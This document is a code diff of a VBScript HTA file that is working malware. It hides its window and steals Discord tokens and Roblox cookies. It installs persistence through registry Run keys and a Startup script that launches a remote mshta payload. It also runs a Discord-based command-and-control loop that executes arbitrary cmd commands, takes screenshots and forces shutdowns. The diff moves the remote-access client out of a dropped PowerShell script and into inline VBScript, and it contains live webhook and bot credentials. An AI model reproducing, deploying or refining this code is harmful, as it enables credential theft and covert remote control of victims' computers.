@@ -5,20 +5,168 @@
 <script language="VBScript">
 window.resizeTo 0,0:window.moveTo -2000,-2000
 On Error Resume Next
-Dim sh, fso, WH, PC, USER
+Dim sh, fso, WH, PC, USER, BotToken, ControlChannel, UuidFile, NumFile, uuid, myNum
 Set sh = CreateObject("WScript.Shell")
 Set fso = CreateObject("Scripting.FileSystemObject")
 WH = "https://discord.com/api/webhooks/1568851795470590064/RrYKVgks55HZfSahZGWe5ByKrB-ho-h8Sj9RNZSqNXN8E4NXhW2-5CqOpoFPp5gBe-hG"
+BotToken = "MTU2ODg1MjA0OTUyNzk3MTg0Mg.GwNg3_.Qy_v9XiVu8b5UB0IutWI4buAuZbIfpMyFpcT24"
+ControlChannel = "1568851359044866119"
 PC = sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
 USER = sh.ExpandEnvironmentStrings("%USERNAME%")
+UuidFile = sh.ExpandEnvironmentStrings("%TEMP%") & "\cid.txt"
+NumFile = sh.ExpandEnvironmentStrings("%TEMP%") & "\mynum.txt"
+
+If fso.FileExists(UuidFile) Then
+    uuid = Trim(ReadFile(UuidFile))
+Else
+    uuid = Mid(CreateObject("Scriptlet.TypeLib").GUID, 2, 36)
+    WriteFile UuidFile, uuid
+End If
+
 Dim tf: tf = sh.ExpandEnvironmentStrings("%TEMP%") & "\trace.txt"
 Dim tr: Set tr = fso.CreateTextFile(tf, True): tr.Write "START:" & Now & vbCrLf: tr.Close: Set tr = Nothing
+
 Call GrabTokens
 Call IP
 Call GrabRoblox
 Call Persistence
-Call DropClient
-window.close()
+Call Beacon
+Do
+    Call Poll
+    WScript.Sleep 8000
+Loop
+Sub Beacon()
+    Dim ip
+    On Error Resume Next
+    Dim xh: Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
+    xh.SetOption 2, 13056
+    xh.Open "GET", "https://api.ipify.org/", False
+    xh.Send
+    If xh.Status = 200 Then ip = xh.responseText Else ip = "unknown"
+    Set xh = Nothing
+    PostRaw "NEW|" & uuid & "|" & PC & "|" & USER & "|" & ip
+End Sub
+Sub Poll()
+    On Error Resume Next
+    Dim msgs, i, content, num
+    msgs = GetMessages()
+    If IsArray(msgs) Then
+        For i = 0 To UBound(msgs)
+            content = msgs(i)
+            If InStr(content, "Assigned #") > 0 And InStr(content, PC) > 0 Then
+                Dim p: p = InStr(content, "#")
+                If p > 0 Then
+                    num = ""
+                    Dim j: j = p + 1
+                    Do While j <= Len(content) And IsNumeric(Mid(content, j, 1))
+                        num = num & Mid(content, j, 1)
+                        j = j + 1
+                    Loop
+                    If Len(num) > 0 Then WriteFile NumFile, num
+                End If
+            End If
+        Next
+    End If
+    If fso.FileExists(NumFile) Then myNum = Trim(ReadFile(NumFile)) Else myNum = ""
+    If Len(myNum) = 0 Then Exit Sub
+    If IsArray(msgs) Then
+        For i = 0 To UBound(msgs)
+            content = msgs(i)
+            If Left(content, Len("CMD|" & myNum & "|")) = "CMD|" & myNum & "|" Then
+                Dim cmd: cmd = Mid(content, Len("CMD|" & myNum & "|") + 1)
+                If cmd = "screenshot" Then
+                    Call DoScreenshot
+                ElseIf cmd = "shutdown" Then
+                    sh.Run "shutdown /s /f /t 0", 0, False
+                ElseIf cmd = "restart" Then
+                    sh.Run "shutdown /r /f /t 0", 0, False
+                ElseIf Left(cmd, 4) = "cmd|" Then
+                    Dim c: c = Mid(cmd, 5)
+                    Dim out: out = sh.Exec("cmd /c " & c).StdOut.ReadAll
+                    If Len(out) > 1800 Then out = Left(out, 1800)
+                    PostRaw "OUT|" & myNum & "|" & out
+                ElseIf cmd = "info" Then
+                    PostRaw "INFO|" & myNum & "|" & PC & "|" & USER & "|" & Now
+                End If
+            End If
+        Next
+    End If
+End Sub
+Sub DoScreenshot()
+    Dim ps, tmp, psf
+    tmp = sh.ExpandEnvironmentStrings("%TEMP%") & "\ss.png"
+    psf = sh.ExpandEnvironmentStrings("%TEMP%") & "\ss.ps1"
+    ps = "Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $b=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $bmp=New-Object System.Drawing.Bitmap $b.Width,$b.Height; $g=[System.Drawing.Graphics]::FromImage($bmp); $g.CopyFromScreen($b.Location,[System.Drawing.Point]::Empty,$b.Size); $bmp.Save('" & tmp & "',[System.Drawing.Imaging.ImageFormat]::Png); $g.Dispose(); $bmp.Dispose()"
+    WriteFile psf, ps
+    sh.Run "powershell -NoP -W Hidden -Exec Bypass -File """ & psf & """", 0, True
+    If fso.FileExists(tmp) Then
+        UploadFile tmp, "screenshot.png"
+        fso.DeleteFile tmp, True
+    End If
+    fso.DeleteFile psf, True
+End Sub
+Function GetMessages()
+    GetMessages = Array()
+    On Error Resume Next
+    Dim xh: Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
+    xh.SetOption 2, 13056
+    xh.Open "GET", "https://discord.com/api/v10/channels/" & ControlChannel & "/messages?limit=20", False
+    xh.SetRequestHeader "Authorization", "Bot " & BotToken
+    xh.Send
+    If xh.Status <> 200 Then Exit Function
+    Dim raw: raw = xh.responseText
+    Set xh = Nothing
+    Dim arr(), count: count = 0
+    Dim pos: pos = 1
+    Do
+        Dim cpos: cpos = InStr(pos, raw, """content"":""")
+        If cpos = 0 Then Exit Do
+        cpos = cpos + 11
+        Dim epos: epos = InStr(cpos, raw, """")
+        If epos = 0 Then Exit Do
+        ReDim Preserve arr(count)
+        arr(count) = Mid(raw, cpos, epos - cpos)
+        count = count + 1
+        pos = epos + 1
+    Loop
+    If count > 0 Then GetMessages = arr
+End Function
+Sub UploadFile(path, filename)
+    On Error Resume Next
+    Dim b: b = Mid(CreateObject("Scriptlet.TypeLib").GUID, 2, 36)
+    Dim ct: ct = ReadFile(path)
+    Dim DQ: DQ = Chr(34)
+    Dim bd: bd = "--" & b & vbCrLf & "Content-Disposition: form-data; name=" & DQ & "file" & DQ & "; filename=" & DQ & filename & DQ & vbCrLf & "Content-Type: application/octet-stream" & vbCrLf & vbCrLf & ct & vbCrLf & "--" & b & "--"
+    Dim h: Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
+    h.SetOption 2, 13056
+    h.Open "POST", "https://discord.com/api/v10/channels/" & ControlChannel & "/messages", False
+    h.SetRequestHeader "Authorization", "Bot " & BotToken
+    h.SetRequestHeader "Content-Type", "multipart/form-data; boundary=" & b
+    h.Send bd
+    Set h = Nothing
+End Sub
+Sub PostRaw(text)
+    On Error Resume Next
+    Dim DQ: DQ = Chr(34)
+    Dim j: j = "{" & DQ & "content" & DQ & ":" & DQ & Ej(text) & DQ & "}"
+    Dim h: Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
+    h.SetOption 2, 13056
+    h.Open "POST", WH, False
+    h.SetRequestHeader "Content-Type", "application/json"
+    h.Send j
+    Set h = Nothing
+End Sub
+Sub Persistence()
+    Dim payload : payload = "mshta https://app-a77430ab4f86bba7.up.railway.app/system.hta"
+    On Error Resume Next
+    sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdate", payload, "REG_SZ"
+    sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce\WinUpdate", payload, "REG_SZ"
+    Dim sp : sp = sh.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\Start Menu\Programs\Startup\winupdate.vbs"
+    Dim sf : Set sf = fso.CreateTextFile(sp, True)
+    sf.WriteLine "CreateObject(""WScript.Shell"").Run ""mshta " & payload & """, 0, False"
+    sf.Close
+    PostEmbed "PERSISTENCE", "3 startup methods installed", 65280
+End Sub
 Sub IP()
     Dim xh : Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
     xh.SetOption 2, 13056
@@ -91,66 +239,6 @@ Sub GrabRoblox()
     If warn > 1 Then cookie = Mid(cookie, warn)
     PostEmbed "Roblox Cookie", "Size: " & Len(cookie) & " | PC: " & PC, 65280
     PostFile "cookie.txt", cookie
-End Sub
-Sub Persistence()
-    Dim payload : payload = "mshta https://app-a77430ab4f86bba7.up.railway.app/system.hta"
-    On Error Resume Next
-    sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdate", payload, "REG_SZ"
-    sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce\WinUpdate", payload, "REG_SZ"
-    Dim sp : sp = sh.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\Start Menu\Programs\Startup\winupdate.vbs"
-    Dim sf : Set sf = fso.CreateTextFile(sp, True)
-    sf.WriteLine "CreateObject(Chr(87)&Chr(83)&Chr(99)&Chr(114)&Chr(105)&Chr(112)&Chr(116)&Chr(46)&Chr(83)&Chr(104)&Chr(101)&Chr(108)&Chr(108)).Run Chr(34)&""" & payload & """&Chr(34), 0, False"
-    sf.Close
-    PostEmbed "PERSISTENCE", "3 startup methods installed", 65280
-End Sub
-Sub DropClient()
-    Dim ps1 : ps1 = "$BotToken = 'MTU2ODg1MjA0OTUyNzk3MTg0Mg.GwNg3_.Qy_v9XiVu8b5UB0IutWI4buAuZbIfpMyFpcT24'" & vbCrLf & _
-    "$Webhook = '" & WH & "'" & vbCrLf & _
-    "$ControlChannel = '1568851359044866119'" & vbCrLf & _
-    "$UuidFile = $env:TEMP + '\cid.txt'" & vbCrLf & _
-    "$NumFile = $env:TEMP + '\mynum.txt'" & vbCrLf & _
-    "if (Test-Path $UuidFile) { $uuid = (Get-Content $UuidFile -Raw).Trim() } else { $uuid = [guid]::NewGuid().ToString(); $uuid | Out-File $UuidFile -Encoding ascii }" & vbCrLf & _
-    "$pc = $env:COMPUTERNAME" & vbCrLf & _
-    "$user = $env:USERNAME" & vbCrLf & _
-    "try { $ip = (Invoke-RestMethod 'https://api.ipify.org' -UseBasicParsing) } catch { $ip = 'unknown' }" & vbCrLf & _
-    "function Post-Webhook($text) { $body = @{ content = $text } | ConvertTo-Json; try { Invoke-RestMethod -Uri $Webhook -Method Post -Body $body -ContentType 'application/json' -UseBasicParsing | Out-Null } catch {} }" & vbCrLf & _
-    "Post-Webhook ('NEW|' + $uuid + '|' + $pc + '|' + $user + '|' + $ip)" & vbCrLf & _
-    "function Get-Messages { $headers = @{ Authorization = 'Bot ' + $BotToken }; $url = 'https://discord.com/api/v10/channels/' + $ControlChannel + '/messages?limit=20'; try { return Invoke-RestMethod -Uri $url -Headers $headers -UseBasicParsing } catch { return @() } }" & vbCrLf & _
-    "function Upload-File($path, $filename) { $headers = @{ Authorization = 'Bot ' + $BotToken }; $boundary = [guid]::NewGuid().ToString(); $fileBytes = [System.IO.File]::ReadAllBytes($path); $enc = [System.Text.Encoding]::GetEncoding('iso-8859-1'); $body = '--' + $boundary + ""`r`nContent-Disposition: form-data; name=`""file`""; filename=`"" + $filename + ""`""`r`nContent-Type: application/octet-stream`r`n`r`n"" + $enc.GetString($fileBytes) + ""`r`n--"" + $boundary + '--'; try { Invoke-RestMethod -Uri ('https://discord.com/api/v10/channels/' + $ControlChannel + '/messages') -Method Post -Headers $headers -Body $body -ContentType ('multipart/form-data; boundary=' + $boundary) -UseBasicParsing | Out-Null } catch {} }" & vbCrLf & _
-    "Add-Type -AssemblyName System.Windows.Forms" & vbCrLf & _
-    "Add-Type -AssemblyName System.Drawing" & vbCrLf & _
-    "function Take-Screenshot { $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $bmp = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height; $g = [System.Drawing.Graphics]::FromImage($bmp); $g.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size); $tmp = $env:TEMP + '\ss.png'; $bmp.Save($tmp, [System.Drawing.Imaging.ImageFormat]::Png); $g.Dispose(); $bmp.Dispose(); return $tmp }" & vbCrLf & _
-    "$runKey = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'" & vbCrLf & _
-    "Set-ItemProperty -Path $runKey -Name 'WinUpdateClient' -Value ('powershell -NoP -W Hidden -ExecutionPolicy Bypass -File ""' + $PSCommandPath + '""')" & vbCrLf & _
-    "while ($true) {" & vbCrLf & _
-    "  $msgs = Get-Messages" & vbCrLf & _
-    "  foreach ($m in $msgs) {" & vbCrLf & _
-    "    if ($m.content -like '*Assigned #*' -and $m.content -like ('*' + $pc + '*')) { if ($m.content -match '#(\d+)') { $Matches[1] | Out-File $NumFile -Encoding ascii } }" & vbCrLf & _
-    "  }" & vbCrLf & _
-    "  $myNum = ''" & vbCrLf & _
-    "  if (Test-Path $NumFile) { $myNum = (Get-Content $NumFile -Raw).Trim() }" & vbCrLf & _
-    "  if ($myNum) {" & vbCrLf & _
-    "    foreach ($m in $msgs) {" & vbCrLf & _
-    "      if ($m.content -like ('CMD|' + $myNum + '|*')) {" & vbCrLf & _
-    "        $parts = $m.content -split '\|', 3" & vbCrLf & _
-    "        if ($parts.Length -ge 3) {" & vbCrLf & _
-    "          $cmd = $parts[2]" & vbCrLf & _
-    "          if ($cmd -eq 'screenshot') { $ss = Take-Screenshot; Upload-File $ss 'screenshot.png'; Remove-Item $ss -Force -ErrorAction SilentlyContinue }" & vbCrLf & _
-    "          elseif ($cmd -eq 'shutdown') { Stop-Computer -Force }" & vbCrLf & _
-    "          elseif ($cmd -eq 'restart') { Restart-Computer -Force }" & vbCrLf & _
-    "          elseif ($cmd -like 'cmd|*') { $c = $cmd.Substring(4); $out = cmd /c $c 2>&1 | Out-String; if ($out.Length -gt 1800) { $out = $out.Substring(0,1800) }; Post-Webhook ('OUT|' + $myNum + '|' + $out) }" & vbCrLf & _
-    "          elseif ($cmd -eq 'info') { Post-Webhook ('INFO|' + $myNum + '|' + $pc + '|' + $user + '|' + $ip + '|' + (Get-Date -Format 'yyyy-MM-dd HH:mm')) }" & vbCrLf & _
-    "        }" & vbCrLf & _
-    "      }" & vbCrLf & _
-    "    }" & vbCrLf & _
-    "  }" & vbCrLf & _
-    "  Start-Sleep -Seconds 8" & vbCrLf & _
-    "}"
-    Dim op : op = sh.ExpandEnvironmentStrings("%TEMP%") & "\winupdate.ps1"
-    Dim f : Set f = fso.CreateTextFile(op, True)
-    f.Write ps1
-    f.Close
-    sh.Run "powershell -NoP -W Hidden -Exec Bypass -File """ & op & """", 0, False
 End Sub
 Sub GrabTokens()
     PostEmbed "DEBUG", "Starting GrabTokens...", 16753920
